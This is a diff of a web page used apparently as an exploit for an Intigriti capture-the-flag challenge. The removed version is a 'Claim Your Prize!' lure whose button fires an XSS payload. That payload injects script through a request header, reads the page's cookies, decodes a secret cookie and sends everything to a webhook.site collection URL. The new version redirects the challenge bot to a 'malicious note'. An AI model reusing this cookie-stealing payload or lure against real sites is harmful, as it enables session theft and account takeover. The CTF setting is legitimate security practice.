@@ -1,78 +1,16 @@
+97b9e884-5e32-42da-9a6b-b0502622d4fd
+
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Claim Your Prize!</title>
-    <style>
-        #trigger {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            padding: 25px;
-            font-size: 28px;
-            background: #FF4141;
-            color: white;
-            border: none;
-            border-radius: 10px;
-            cursor: pointer;
-            z-index: 9999;
-        }
-    </style>
+  <meta charset="UTF-8">
+  <title>Redirecting…</title>
+  <script>
+    // Immediately send the Bot to our malicious note
+    window.location = "https://challenge-0325.intigriti.io//note/97b9e884-5e32-42da-9a6b-b0502622d4fd";
+  </script>
 </head>
 <body>
-    <button id="trigger">CLICK HERE</button>
-
-    <script>
-        document.getElementById('trigger').onclick = () => {
-            const payload = `
-                (() => {
-                    const report = data => {
-                        const img = new Image();
-                        img.src = 'https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?' 
-                            + btoa(JSON.stringify(data));
-                    }
-                    
-                    try {
-                        const secret = document.cookie
-                            .split('; ')
-                            .find(r => r.startsWith('secret='))
-                            ?.split('=')[1];
-                        
-                        const flag = atob(secret || '')?.split(':')[1];
-                        
-                        report({
-                            status: 'success',
-                            cookies: document.cookie,
-                            decoded: atob(secret),
-                            flag: flag
-                        });
-                    } catch(e) {
-                        report({
-                            status: 'error',
-                            error: e.message,
-                            stack: e.stack
-                        });
-                    }
-                })()
-            `.replace(/\n/g, ' ').replace(/'/g, "\\'");
-
-            window.location = `https://challenge-0325.intigriti.io/note/leak#` + 
-                encodeURIComponent(
-                    `<img src=x onerror="
-                        fetch('/api/track', {
-                            headers: {
-                                'x-user-ip': '${payload}'
-                            }
-                        })
-                        .then(r => r.text())
-                        .then(t => {
-                            const s = document.createElement('script');
-                            s.text = t;
-                            document.body.appendChild(s);
-                        })
-                    ">`
-                );
-        };
-    </script>
+  Redirecting…
 </body>
 </html>
